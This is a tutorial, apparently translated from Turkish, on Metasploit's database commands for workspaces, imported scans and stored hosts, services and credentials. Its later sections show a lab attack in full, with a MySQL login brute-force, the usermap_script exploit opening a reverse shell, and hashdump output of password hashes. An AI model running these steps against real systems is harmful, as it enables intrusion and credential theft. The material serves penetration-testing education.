---
draft: false
title: Database Usage in Metasploit Framework
date: 2017-05-13T12:42:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Within the Metasploit Framework, the database feature offered with Postgresql support is very useful and records the scan results in one place.
url: /msf-icinde-database-kullanimi/
featured_image: /images/metasploit.jpg
weight: 50
categories:
  - Metasploit Framework
tags:
  - cybersecurity
  - metasploit framework
linkTitle: Database Usage
translationKey: msf-database-usage
---
Within the Metasploit Framework, the database feature offered with Postgresql support is very useful and records the scan results in one place. Recording the results found makes it easier to transfer information such as IP addresses, port numbers or Hash Dump etc. to exploits to be used in the next steps.

The following explanation is based on the Kali operating system and the commands have been tested in Kali.

## Setting Up the Metasploit Database

First of all, postgresql should be started if it has not started yet.

```bash
root@kali:~# systemctl start postgresql
```

After starting postgresql, the database should be prepared for initial use. For this, we can use the ```msfdb init`` script.

```bash
root@kali:~# msfdb init
Creating database user 'msf'
Enter password for **new role:
Enter it again:
Creating databases 'msf' and 'msf_test'
Creating configuration file **in** /usr/share/metasploit-framework/config/database.yml
Creating initial database schema
```

## Workspace Usage

When msfconsole starts, first check the database connection with the `db_status` command.

```bash
msf > db_status
> postgresql connected to msf
```

After establishing the database connection, we can organize the work we will do by recording it in folders called **Workspace**. Just as we record our records in folders according to their subjects on normal computers, the same approach applies to msfconsole.

## Listing Workspaces

Simply giving the `workspace` command without any parameters lists the currently registered work folders. The currently active workspace is indicated with a * sign at the beginning.

```bash
msf > workspace
* default
msfu
lab1
lab2
lab3
lab4
msf >
```

## Creating and Deleting Workspaces

The `-a` parameter is used to create a new Workspace, and the `-d` parameter is used to delete it. After the parameter, simply type the name of the Workspace you want to create or delete.

### lab4 workspace is created

```bash
msf > workspace -a lab4
> Added workspace: lab4
msf >
```

### lab4 workspace is deleted

```bash
msf > workspace -d lab4
> Deleted workspace: lab4
msf > workspace
```

### workspace change

After the existing folders are listed with the `workspace` command, if we want to move to a folder other than the active one, it is enough to write the name of the folder we want to move to after the `workspace` command as follows.

```bash
msf > workspace msfu
> Workspace: msfu
msf > workspace
default
* msfu
lab1
lab2
lab3
lab4
msf >
```

### Workspace Help

You can use the `-h` parameter for detailed help.

```bash
msf > workspace -h
Usage:
workspace List workspaces
workspace -v List workspaces verbosely
workspace [name] Switch workspace
workspace -a [name] ... Add workspace(s)
workspace -d [name] ... Delete workspace(s)
workspace -D Delete all workspaces
workspace -r Rename workspace
workspace -h Show this help information

msf >
```

Now the results you will obtain from the scans you will perform will be recorded in the active workspace. Now, as the next step, let's look at other commands we can use regarding the database.

First, let's look at what commands msfconsole provides us regarding the database. When we give the `help` command in `msfconsole`, the database commands are shown to us under a separate heading as follows.

```bash
msf > help
...snip...

Database Backend Commands
=========================

Command Description
------- -----------
credits List all credentials **in the database
db_connect Connect to an existing database
db_disconnect Disconnect from the current database instance
db_export Export a file containing the contents of the database
db_import Import a scan result file (filetype will be auto-detected)
db_nmap Executes nmap and records the output automatically
db_rebuild_cache Rebuilds the database-stored module cache
db_status Show the current database status
hosts List all hosts **in the database
loot List all loot **in the database
notes List all notes **in the database
services List all services **in the database
vulns List all vulnerabilities **in the database
workspace Switch between database workspaces
```

## Database Usage

Let's see the commands we viewed with the `help` command above with detailed examples.

## db_import

This command allows us to import the scan results you made with nmap outside of msfconsole. You must have saved the output of the ```nmap`` scan in **xml** format.

In the example below, the file named `/root/msfu/nmapScan` is transferred to msfconsole. The IP addresses, ports, and all other result information will now be imported. The check was made with the `hosts` command given after the `db_import` command.

```bash
msf > db_import /root/msfu/nmapScan
> Importing 'Nmap XML' data
> Import: Parsing with 'Rex::Parser::NmapXMLStreamParser'
> Importing host 172.16.194.172
> Successfully imported /root/msfu/nmapScan
msf > hosts

Hosts
=====

address mac name os_name os_flavor os_sp purpose info comments
------- --- ---- ------- --------- ----- ------- ---- --------
172.16.194.172 00:0C:29:D1:62:80 Linux Ubuntu server

msf >
```

## db_nmap

You can import nmap scan results from outside or inside with `msfconsole` You can perform an nmap scan without going out. The `db_nmap` command is used for this. Scans you perform with `db_nmap` will automatically be recorded in the active `workspace`.

```bash
msf > db_nmap -A 172.16.194.134
> Nmap: Starting Nmap 5.51SVN (<a href="http://nmap.org/">http://nmap.org</a> ) at 2012-06-18 12:36 EDT
> Nmap: Nmap scan report for 172.16.194.134
> Nmap: Host is up (0.00031s latency).
> Nmap: Not shown: 994 closed ports
> Nmap: PORT STATE SERVICE VERSION
> Nmap: 80/tcp open http Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4

...snip...

> Nmap: HOP RTT ADDRESS
> Nmap: 1 0.31 ms 172.16.194.134
> Nmap: OS and Service detection performed. Please report any incorrect results at <a href="http://nmap.org/submit/">http://nmap.org/submit/</a> .
> Nmap: Nmap **done**: 1 IP address (1 host up) scanned **in **14.91 seconds
msf >
msf > hosts

Hosts
**=====**

address mac name os_name os_flavor os_sp purpose info comments
------- --- ---- ------- --------- ----- ------- ---- --------
172.16.194.134 00:0C:29:68:51:BB Microsoft Windows XP server
172.16.194.172 00:0C:29:D1:62:80 Linux Ubuntu server

msf >

```

## db_export

You may want to export the scan results you made in a project you are working on and use them in your reports. There is a `db_export` command for this. When you give the `-f` parameter to the `db_export` command and the file name, the file you want is transferred to the external folder you specify. There are two different types of files in the export. All information in `xml` format or username and password etc. information in `pwdump` format.

First, let's see the help information;

```bash
msf > db_export -h
Usage:
db_export -f [-a] [filename]
Format can be one of: xml, pwdump
[-] No output file was specified
```

Now let's export the information in the workspace we are actively in in `xml` format.

```bash
msf > db_export -f xml /root/msfu/Exported.xml
> Starting export of workspace msfu to /root/msfu/Exported.xml [ xml ]...
> **>>** Starting export of report
> **>>** Starting export of hosts
> **>>** Starting export of events
> **>>** Starting export of services
> **>>** Starting export of credentials
> **>>** Starting export of websites
> **>>** Starting export of web pages
> **>>** Starting export of web forms
> **>>** Starting export of web vulns
> **>>** Finished export of report
> Finished export of workspace msfu to /root/msfu/Exported.xml [ xml ]...
```

## hosts

The `hosts` command displays the scans performed so far. shows us the IP information, PORT information, etc. found as a result. First, let's view the help information of the `hosts` command.

```bash
msf > hosts -h
Usage: hosts [ options ] [addr1 addr2 ...]

OPTIONS:
 -a,--add Add the hosts instead of searching
 -d,--delete Delete the hosts instead of searching
 -c Only show the given columns (see list below)
 -h,--help Show this help information
 -u,--up Only show hosts which are up
 -o Send output to a file **in **csv format
 -O Order rows by specified column number
 -R,--rhosts Set RHOSTS from the results of the search
 -S,--search Search string to filter by
 -i,--info Change the info of a host
 -n,--name Change the name of a host
 -m,--comment Change the comment of a host
 -t,--tag Add or specify a tag to a range of hosts
```

### Displaying the requested columns in Hosts

When you use the `hosts` command alone, the stored information is organized and displayed in the columns listed below.

**Available Columns:** address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags

Now, let's display only the columns and information we will use. To do this, we must write the `-c` parameter and the column names we want. In the example below, it is requested that the address, os_flavor columns and information be displayed.

```bash
msf > hosts -c address,os_flavor

Hosts
**=====**

address os_flavor
------- ---------
172.16.194.134 XP
172.16.194.172 Ubuntu
```

## Using Hosts Information in Modules

We can transfer some information from the hosts list, where the information obtained from the scans we made is kept, to the modules we want to use. We displayed the columns we wanted with the `hosts -c address,os_flavor` command we used above. Now let's search this list and search for the line that says "Ubuntu" in the results.

```bash
msf > hosts -c address,os_flavor -S Linux

Hosts
**=====**

address os_flavor
------- ---------
172.16.194.172 Ubuntu

msf >
```

Here we found the IP Address we will use. Now let's go into a module and look at the variables the module needs.

```bash
msf auxiliary(tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

 Name Current Setting Required Description
 ---- --------------- -------- -----------
 CONCURRENCY 10 yes The number of concurrent ports to check per host
 FILTER no The filter string for **capturing traffic
 INTERFACE no The name of the interface
 PCAPFILE no The name of the PCAP capture file to process
 PORTS 1-10000 yes Ports to scan (e.g. 22-25,80,110-900)
 RHOSTS yes The target address range or CIDR identifier
 SNAPLEN 65535 yes The number of bytes to capture
 THREADS 1 yes The number of concurrent threads
 TIMEOUT 1000 yes The socket connect timeout **in **milliseconds
```

In the output above, the RHOSTS variable is seen as empty. The Remote Host IP address needs to be entered here. Normally, you can enter the process with the command `set RHOSTS 172.16.194.172`. However, setting this in multiple modules will increase the possibility of making an error each time.

In this case, we can transfer the IP address we found with the search we made with the command `hosts -c address,os_flavor -S Linux` directly to the module we are in by adding the `-R` parameter to the end. As seen in the example below, the “Ubuntu” IP address is directly transferred to the `tcp` module.

```bash
msf auxiliary(tcp) > hosts -c address,os_flavor -S Linux -R

Hosts
**=====**

address os_flavor
------- ---------
172.16.194.172 Ubuntu

RHOSTS => 172.16.194.172

msf auxiliary(tcp) > run

> 172.16.194.172:25 - TCP OPEN
> 172.16.194.172:23 - TCP OPEN
> 172.16.194.172:22 - TCP OPEN
> 172.16.194.172:21 - TCP OPEN
> 172.16.194.172:53 - TCP OPEN
> 172.16.194.172:80 - TCP OPEN

...snip...

> 172.16.194.172:5432 - TCP OPEN
> 172.16.194.172:5900 - TCP OPEN
> 172.16.194.172:6000 - TCP OPEN
> 172.16.194.172:6667 - TCP OPEN
> 172.16.194.172:6697 - TCP OPEN
> 172.16.194.172:8009 - TCP OPEN
> 172.16.194.172:8180 - TCP OPEN
> 172.16.194.172:8787 - TCP OPEN
> Scanned 1 of 1 hosts (100% complete)
> Auxiliary module execution completed
```

Without filtering the hosts list, we can also transfer all the available IP addresses to the active module. In this case, it will be sufficient to give only the `-R` parameter to the `hosts` command without entering any search expression.

```bash
msf  auxiliary(tcp) > hosts -R

Hosts
**=====**

address         mac                name  os_name            os_flavor  os_sp  purpose  info  comments
-------         ---                ----  -------            ---------  -----  -------  ----  --------
172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                server         
172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            server         

RHOSTS => 172.16.194.134 172.16.194.172

msf  auxiliary(tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting                Required  Description
   ----         ---------------                --------  -----------
   CONCURRENCY  10                             yes       The number of concurrent ports to check per host
   FILTER                                      no        The filter string for **capturing traffic
   INTERFACE                                   no        The name of the interface
   PCAPFILE                                    no        The name of the PCAP capture file to process
   PORTS        1-10000                        yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       172.16.194.134 172.16.194.172  yes       The target address range or CIDR identifier
   SNAPLEN      65535                          yes       The number of bytes to capture
   THREADS      1                              yes       The number of concurrent threads
   TIMEOUT      1000                           yes       The socket connect timeout **in **milliseconds
```

As you can see above, all IP addresses are transferred to RHOSTS. Although it is not time-consuming to enter a few IP addresses manually, you will definitely need this feature when you want to run a module on hundreds of IP addresses.

For example, you scanned a network and found 112 active devices and IP addresses. You want to try the **smb_version** module on all of them. At this point, the `hosts -R` command will make things much easier.

## Services

While the `hosts` command gives the IP and other information found in the scans, the `services` command lists the services running and discovered on these IP addresses. Of course, you must have performed a service and version scan with the `db_nmap` command.

First, let's view the help information.

```bash
msf > services -h

Usage: services [-h] [-u] [-a] [-r ] [-p >port1,port2>] [-s >name1,name2>] [-o ] [addr1 addr2 ...]

 -a,--add Add the services instead of searching
 -d,--delete Delete the services instead of searching
 -c Only show the given columns
 -h,--help Show this help information
 -s Search for **a list of service names
 -p Search for **a list of ports
 -r Only show [tcp|udp] services
 -u,--up Only show services which are up
 -o Send output to a file **in **csv format
 -R,--rhosts Set RHOSTS from the results of the search
-S,--search Search string to filter by
```

The `services` command shows us the information organized in the following columns.

**Available columns:** created_at, info, name, port, proto, state, updated_at

Just like we search in the `hosts` command, we can search in the columns in `services` with the `-c` parameter and a specific expression with the `-S` parameter.

### Searching in Specific Columns

```bash
msf > services -c name,info 172.16.194.134

Services
**========**

hostname info
---- ---- ----
172.16.194.134 http Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
172.16.194.134 msrpc Microsoft Windows RPC
172.16.194.134 netbios-ssn
172.16.194.134 http Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
172.16.194.134 microsoft-ds Microsoft Windows XP microsoft-ds
172.16.194.134 mysql
```

### Search for a Specific Expression in Specific Columns

```bash
msf > services -c name,info -S http

Services
**=========**

host name info
---- ---- ----
172.16.194.134 http Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
172.16.194.134 http Apache httpd 2.2.17 (Win32) mod_ssl/2.2.17 OpenSSL/0.9.8o PHP/5.3.4 mod_perl/2.0.4 Perl/v5.10.1
172.16.194.172 http Apache httpd 2.2.8 (Ubuntu) DAV/2
172.16.194.172 http Apache Tomcat/Coyote JSP engine 1.1
```

### Searching Columns with a Specific Port

```bash
msf > services -c info,name -p 445

Services
**=========**

host info name
---- ---- ----
172.16.194.134 Microsoft Windows XP microsoft-ds microsoft-ds
172.16.194.172 Samba smbd 3.X workgroup: WORKGROUP netbios-ssn
```

### Searching for Desired Columns in a Specific Port Range

```bash
msf > services -c port,proto,state -p 70-81
Services
**========**
host port proto state
---- ---- ----- -----
172.16.194.134 80 tcp open
172.16.194.172 75 tcp closed
172.16.194.172 71 tcp closed
172.16.194.172 72 tcp closed
172.16.194.172 73 tcp closed
172.16.194.172 74 tcp closed
172.16.194.172 70 tcp closed
172.16.194.172 76 tcp closed
172.16.194.172 77 tcp closed
172.16.194.172 78 tcp closed
172.16.194.172 79 tcp closed
172.16.194.172 80 tcp open
172.16.194.172 81 tcp closed
```

### Searching for Port Information of a Specific Service and IP Address

In a few examples above, we searched for a specific expression with `-S` (capital S). The `-s` parameter also makes it particularly easy to search the services list.

```bash
msf > services -s http -c port 172.16.194.134
Services
**========**
host port
---- ----
172.16.194.134 80
172.16.194.134 443
```

### Searching for an expression within Services

```bash
msf > services -S Unr

Services
**========**
host port proto name state info
---- ---- ----- ---- ----- ----
172.16.194.172 6667 tcp irc open Unreal ircd
172.16.194.172 6697 tcp irc open Unreal ircd
```

## CSV Export

Both `hosts` and also printing the search results we made on the information recorded in the `services` lists to the screen. You can also export as a comma-separated file in SV format. Here are a few examples.

```bash
msf > services -s http -c port 172.16.194.134 -o /root/msfu/http.csv

> Wrote services to /root/msfu/http.csv

msf > hosts -S Linux -o /root/msfu/linux.csv
> Wrote hosts to /root/msfu/linux.csv

msf > cat /root/msfu/linux.csv
> exec: cat /root/msfu/linux.csv

address,mac,name,os_name,os_flavor,os_sp,purpose,info,comments
"172.16.194.172","00:0C:29:D1:62:80","","Linux","Debian","","server","",""

msf > cat /root/msfu/http.csv
> exec:cat /root/msfu/http.csv

host,port
"172.16.194.134","80"
"172.16.194.134","443"
```

## Creds

The `creds` command, similar to the `hosts` and `services` commands, shows us the user information and passwords obtained in the scans. When you give the `creds` command without entering any additional parameters, all registered user information is listed.

```bash
msf > creds

Credentials
**============**

host port user pass type active?
---- ---- ---- ---- ---- -------

> Found 0 credentials.
```

Just as the results found in searches made with the `db_nmap` command are kept in the `hosts` and `services` tables, the information you obtain when you use any username and password finding module is also kept in the `creds` table. Let's see an example. In this example, the `mysql_login` module is run and an attempt is made to log in to the MySql service running at the 172.16.194.172 IP address. When successful, the successful username and password information is recorded in the `creds` table for later use.

```bash
msf auxiliary(mysql_login) > run

> 172.16.194.172:3306 MYSQL - Found remote MySQL version 5.0.51a
> 172.16.194.172:3306 MYSQL - [1/2] - Trying username:'root' with password:''
> 172.16.194.172:3306 - SUCCESSFUL LOGIN 'root' : ''
> Scanned 1 of 1 hosts (100% complete)
> Auxiliary module execution completed
msf auxiliary(mysql_login) > creds

Credentials
**===========**

host port user pass type active?
---- ---- ---- ---- ---- -------
172.16.194.172 3306 root password true

>Found 1 credential.
msf auxiliary(mysql_login) >
```

### Manually Adding Data to the Creds Table

When you log in to a system, you can also transfer the username and password information you found yourself without using a module to the `creds` table for later use, using the format in the example below

```bash
msf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
> Time: 2012-06-20 20:31:42 UTC Credential: host=172.16.194.134 port=445 proto=tcp sname= type=password user=Administrator pass=7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: active=true

msf > credits

Credentials
**===========**

host port user pass type active?
---- ---- ---- ---- ---- ---- ----
172.16.194.134 445 Administrator 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e::: password true

> Found 1 credential.
```

## Loot

In a system that is logged in, the hash table is usually first extracted by performing `hashdump`. Here, with the `loot` command, the information of the hash values ​​obtained as a result of the scan can be seen. In the example below, `loot` help is displayed.

```bash
msf > loot -h
Usage: loot
 Info: loot [-h] [addr1 addr2 ...] [-t ]
 Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] [-t [type]
 Del: loot -d [addr1 addr2 ...]

 -a,--add Add loot to the list of addresses, instead of listing
 -d,--delete Delete *****all***** loot matching host and type
 -f,--file File with contents of the loot to add
 -i,--info Info of the loot to add
 -t Search for **a list of types
 -h,--help Show this help information
 -S,--search Search string to filter by
```

Then, using the **usermap_script** module, a session is opened on the opposite system and the hash values ​​for the opened session are found with the **hashdump** module. If successful, the found hash values ​​are recorded in the `loot` table for later use.

```bash
msf exploit(usermap_script) > exploit

> Started reverse double handler
> Accepted the first client connection...
> Accepted the second client connection...
> Command: echo 4uGPYOrars5OojdL;
> Writing to socket A
> Writing to socket B
> Reading from sockets...
> Reading from socket B
> B: "4uGPYOrars5OojdL\r "
>Matching...
> A is input...
> Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:55138) at 2012-06-27 19:38:54 -0400

^Z
Background session 1? [y/N] y

msf  exploit(usermap_script) > use post/linux/gather/hashdump
msf  post(hashdump) > show options

Module options (post/linux/gather/hashdump):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.

msf  post(hashdump) > sessions -l

Active sessions
**===============**

  Id  Type        Information  Connection
  --  ----        -----------  ----------
  1   shell unix               172.16.194.163:4444 -> 172.16.194.172:55138 (172.16.194.172)

msf  post(hashdump) > run

[+] root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
[+] sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
[+] klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
[+] msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
[+] postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
[+] user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:1001:1001:just a user,111,,:/home/user:/bin/bash
[+] service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:1002:1002:,,,:/home/service:/bin/bash
[+] Unshadowed Password File: /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
> Post module execution completed
```

To see the hash values ​​stored in the database `loot` Just give the command.

```bash
msf post(hashdump) > loot

loot
**====**

host service type name content info path
---- ------- ---- ---- ------- ---- ----
172.16.194.172 linux.hashes unshadowed_passwd.pwd text/plain Linux Unshadowed Password File /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.hashes_264208.txt
172.16.194.172 linux.passwd passwd.tx text/plain Linux Passwd File /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.passwd_953644.txt
172.16.194.172 linux.shadow shadow.tx text/plain Linux Password Shadow File /root/.msf4/loot/20120627193921_msfu_172.16.194.172_linux.shadow_492948.txt ```

In this article, we tried to explain the `database` related commands shown in the `help` command given in `msfconsole`.

```bash
Database Backend Commands
**=========================**

 Command Description
 ------- -----------
 credits List all credentials in the database
 db_connect Connect to an existing database
 db_disconnect Disconnect from the current database instance
 db_export Export a file containing the contents of the database
 db_import Import a scan result file (filetype will be auto-detected)
 db_nmap Executes nmap and records the output automatically
 db_rebuild_cache Rebuilds the database-stored module cache
 db_status Show the current database status
 hosts List all hosts in the database
 loot List all loot in the database
 notes List all notes in the database
 services List all services in the database
 vulns List all vulnerabilities in the database
 workspace Switch between database workspaces
```

You may think that we left out the `vulns` command. It is possible to guess more or less what the `vulns` command does. The article is long enough. I leave the `vulns` command to you
